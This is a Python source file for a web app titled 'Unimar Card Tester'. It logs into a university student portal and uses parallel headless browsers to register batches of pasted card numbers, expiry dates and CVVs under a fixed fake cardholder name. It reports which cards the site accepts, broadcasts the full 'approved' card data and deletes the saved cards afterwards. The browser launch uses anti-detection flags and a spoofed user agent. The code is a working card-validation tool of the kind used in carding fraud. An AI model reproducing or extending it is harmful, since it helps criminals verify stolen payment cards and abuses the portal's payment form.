import asyncio
import os
import random
import time
from contextlib import asynccontextmanager
from pathlib import Path

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from playwright.async_api import async_playwright

# ===================== CONFIG =====================
URL_LOGIN = "https://digital.unimar.br/login"
URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"

EMAIL = os.getenv("UNIMAR_EMAIL")
SENHA = os.getenv("UNIMAR_SENHA")
NOME_FIXO = "Bruna Mendes"

# ===================== ESTADO =====================
estado = {
    "rodando": False,
    "clients": set(),
    "total_cartoes": 0,
    "processados": 0,
    "aprovados": 0,
    "fila_vazia": False,
    "tarefas_concluidas": 0,
    "start_time": None,
    "cancelado": False,
}

# ===================== LOGGING =====================
async def broadcast(type: str, data: dict = None):
    """Envia mensagem para todos os clientes WebSocket conectados."""
    if data is None:
        data = {}
    message = {"type": type, **data}
    dead_clients = set()
    for client in list(estado["clients"]):
        try:
            await client.send_json(message)
        except Exception:
            dead_clients.add(client)
    estado["clients"].difference_update(dead_clients)

def log(mensagem: str):
    """Loga mensagem no console e broadcast para clientes."""
    timestamp = time.strftime("%H:%M:%S")
    full_msg = f"[{timestamp}] {mensagem}"
    print(full_msg)
    try:
        asyncio.create_task(broadcast("log", {"mensagem": full_msg}))
    except RuntimeError:
        pass

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    Path("aprovados.txt").touch(exist_ok=True)
    yield
    estado["rodando"] = False
    estado["cancelado"] = True

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
async def heartbeat_task(websocket: WebSocket):
    """Envia heartbeat a cada 25s para manter conexão viva."""
    try:
        while True:
            await asyncio.sleep(25)
            await websocket.send_json({"type": "ping"})
    except Exception:
        pass

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    estado["clients"].add(websocket)

    # Enviar estado atual
    try:
        await websocket.send_json({
            "type": "status",
            "rodando": estado["rodando"],
            "total": estado["total_cartoes"],
            "processados": estado["processados"],
            "aprovados": estado["aprovados"]
        })
    except Exception:
        estado["clients"].discard(websocket)
        return

    # Iniciar heartbeat
    hb = asyncio.create_task(heartbeat_task(websocket))

    try:
        while True:
            data = await websocket.receive_json()
            if data.get("type") == "pong":
                continue
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        hb.cancel()
        try:
            await hb
        except asyncio.CancelledError:
            pass
        estado["clients"].discard(websocket)

# ===================== FUNÇÕES AUXILIARES =====================
async def limpar_cartoes_antigos(page):
    """Remove todos os cartões salvos na conta."""
    try:
        log("[Faxina] Iniciando limpeza de cartões antigos...")
        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle", timeout=30000)
        await asyncio.sleep(2)

        botoes = page.get_by_role("button", name="Remover")
        total = await botoes.count()

        if total == 0:
            log("[Faxina] Nenhum cartão antigo encontrado.")
            return

        log(f"[Faxina] {total} cartões encontrados. Removendo...")

        removidos = 0
        max_tentativas = total * 4
        for tentativa in range(max_tentativas):
            if estado["cancelado"]:
                log("[Faxina] Cancelado pelo usuário.")
                return

            count = await botoes.count()
            if count == 0:
                break

            try:
                await botoes.first.click(force=True, timeout=5000)
                await asyncio.sleep(0.8)

                confirm = page.get_by_role("button", name="Sim").or_(
                    page.get_by_role("button", name="Confirmar")
                )
                if await confirm.is_visible(timeout=3000):
                    await confirm.click(force=True, timeout=5000)
                    await page.wait_for_load_state("networkidle", timeout=10000)
                    await asyncio.sleep(1.0)
                    removidos += 1
            except Exception:
                try:
                    await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                    await asyncio.sleep(0.5)
                except Exception:
                    pass

        log(f"[Faxina] {removidos} cartões removidos com sucesso!")
    except Exception as e:
        log(f"[Faxina] Erro: {e}")

async def login_mestre(playwright):
    """Realiza login e salva estado da sessão."""
    try:
        log("[Autenticação] Iniciando login mestre...")
        browser = await playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-blink-features=AutomationControlled",
            ]
        )
        context = await browser.new_context(
            viewport={"width": 1280, "height": 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))

        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)

        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()

        await page.wait_for_selector("text=Meus Cartões", timeout=30000)

        await limpar_cartoes_antigos(page)
        await context.storage_state(path="sessao_unimar.json")

        await context.close()
        await browser.close()
        log("[Autenticação] Login e faxina inicial concluídos!")
        return True
    except Exception as e:
        log(f"[ERRO] Login falhou: {e}")
        return False

async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict, semaforo: asyncio.Semaphore):
    """Worker que processa cartões em um contexto de browser isolado."""
    context = None
    try:
        await asyncio.sleep(id_worker * 2.5)
        log(f"[Canal {id_worker}] Iniciando...")

        context = await browser.new_context(storage_state="sessao_unimar.json")
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))

        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle", timeout=30000)

        while estado["rodando"] and not estado["cancelado"]:
            try:
                try:
                    item = await asyncio.wait_for(fila.get(), timeout=2.0)
                except asyncio.TimeoutError:
                    if fila.empty() and estado["tarefas_concluidas"] >= estado["total_cartoes"]:
                        estado["fila_vazia"] = True
                        log(f"[Canal {id_worker}] Fila vazia, encerrando...")
                        break
                    continue

                indice, linha, tentativas = item

                try:
                    partes = [x.strip() for x in linha.split("|")]
                    if len(partes) != 4:
                        log(f"[Canal {id_worker}][Item {indice}] ❌ Formato inválido: {linha}")
                        fila.task_done()
                        estado["tarefas_concluidas"] += 1
                        await broadcast("progresso", {
                            "processados": estado["tarefas_concluidas"],
                            "total": estado["total_cartoes"],
                            "aprovados": estado["aprovados"]
                        })
                        continue

                    numero, mes, ano, cvv = partes
                    log(f"[Canal {id_worker}][Item {indice}] Processando: ****{numero[-4:]}")

                    await page.goto(URL_MEUS_CARTOES, wait_until="networkidle", timeout=30000)
                    await asyncio.sleep(random.uniform(1.0, 2.5))

                    btn_add = page.get_by_role("button", name="Adicionar Cartão de Crédito")
                    if await btn_add.is_visible(timeout=5000):
                        await btn_add.click(force=True)
                        await asyncio.sleep(0.5)
                    else:
                        await page.evaluate("window.scrollTo(0, 0)")
                        await asyncio.sleep(0.5)
                        await btn_add.click(force=True)

                    await page.get_by_role("textbox", name="Número do cartão").fill(numero)
                    await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
                    await page.get_by_label("Mês").select_option(mes)
                    await page.get_by_label("Ano").select_option(ano)
                    await page.get_by_role("textbox", name="CVV").fill(cvv)

                    botoes_antes = await page.get_by_role("button", name="Remover").count()
                    await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)

                    resultado = None
                    for check in range(40):
                        if not estado["rodando"] or estado["cancelado"]:
                            resultado = "cancelado"
                            break

                        try:
                            current_removals = await page.get_by_role("button", name="Remover").count()
                            if current_removals > botoes_antes:
                                resultado = "aprovado"
                                break
                        except Exception:
                            pass

                        try:
                            body = await page.locator("body").inner_text(timeout=2000)
                            body_lower = body.lower()
                            if any(x in body_lower for x in ["inválida", "recusado", "erro", "inválido", "não foi possível"]):
                                resultado = "reprovado"
                                break
                        except Exception:
                            pass

                        await asyncio.sleep(1.5)

                    if resultado == "aprovado":
                        log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                        await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                        estado_fluxo["houve_aprovados"] = True
                        estado["aprovados"] += 1
                    elif resultado == "reprovado":
                        log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                        await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                    elif resultado == "cancelado":
                        log(f"[Canal {id_worker}][Item {indice}] ⛔ Cancelado pelo usuário")
                    else:
                        log(f"[Canal {id_worker}][Item {indice}] ⚠️ Timeout - sem resposta clara")
                        await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})

                except Exception as e:
                    log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
                finally:
                    fila.task_done()
                    estado["tarefas_concluidas"] += 1
                    await broadcast("progresso", {
                        "processados": estado["tarefas_concluidas"],
                        "total": estado["total_cartoes"],
                        "aprovados": estado["aprovados"]
                    })

            except Exception as e:
                log(f"[Canal {id_worker}] Erro geral: {e}")
                await asyncio.sleep(1)

    except Exception as e:
        log(f"[Canal {id_worker}] Erro fatal: {e}")
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass
        log(f"[Canal {id_worker}] Finalizado")

async def processar_cartoes(texto_cartoes: str, num_canais: int):
    """Função principal que orquestra o processamento dos cartões."""
    try:
        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
        linhas = list(dict.fromkeys(linhas))

        estado["total_cartoes"] = len(linhas)
        estado["processados"] = 0
        estado["aprovados"] = 0
        estado["tarefas_concluidas"] = 0
        estado["fila_vazia"] = False
        estado["cancelado"] = False
        estado["start_time"] = time.time()

        if estado["total_cartoes"] == 0:
            log("[ERRO] Nenhum cartão fornecido para teste.")
            return

        num_canais = min(num_canais, estado["total_cartoes"], 6)
        if num_canais < 1:
            num_canais = 1

        log(f"[Sistema] Executando com {num_canais} canal(is) para {estado['total_cartoes']} cartão(ões)")

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            if not await login_mestre(pw):
                log("[ERRO] Falha no login. Abortando.")
                return

            estado_fluxo = {"houve_aprovados": False}

            browser = await pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-web-security",
                    "--disable-features=IsolateOrigins,site-per-process",
                    "--disable-blink-features=AutomationControlled",
                ]
            )

            semaforo = asyncio.Semaphore(num_canais)

            tasks = [
                asyncio.create_task(
                    worker_contexto(i, browser, fila, estado_fluxo, semaforo)
                )
                for i in range(1, num_canais + 1)
            ]

            await asyncio.gather(*tasks, return_exceptions=True)

            if estado_fluxo["houve_aprovados"] and not estado["cancelado"]:
                log("[Sistema] Iniciando faxina final...")
                try:
                    faxina_context = await browser.new_context(storage_state="sessao_unimar.json")
                    faxina_page = await faxina_context.new_page()
                    await limpar_cartoes_antigos(faxina_page)
                    await faxina_context.close()
                except Exception as e:
                    log(f"[Faxina Final] Erro: {e}")

            await browser.close()

    except Exception as e:
        log(f"[ERRO CRÍTICO] {e}")
    finally:
        estado["rodando"] = False
        elapsed = time.time() - estado["start_time"] if estado["start_time"] else 0
        log(f"[Sistema] Processamento concluído em {elapsed:.1f}s")
        await broadcast("status", {"rodando": False})


# ===================== ROTAS =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado["rodando"]:
        return {"status": "já_em_execucao"}

    estado["rodando"] = True
    estado["cancelado"] = False
    await broadcast("status", {"rodando": True})
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    return {"status": "iniciado", "total_cartoes": len([l for l in data.lista.splitlines() if l.strip()])}

@app.post("/api/parar")
async def parar():
    estado["rodando"] = False
    estado["cancelado"] = True
    log("⛔ Interrupção solicitada pelo usuário.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("templates/index.html", encoding="utf-8") as f:
        return f.read()

@app.get("/api/status")
async def get_status():
    """Endpoint para verificar status atual."""
    return {
        "rodando": estado["rodando"],
        "total": estado["total_cartoes"],
        "processados": estado["tarefas_concluidas"],
        "aprovados": estado["aprovados"]
    }

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=5000, reload=False)
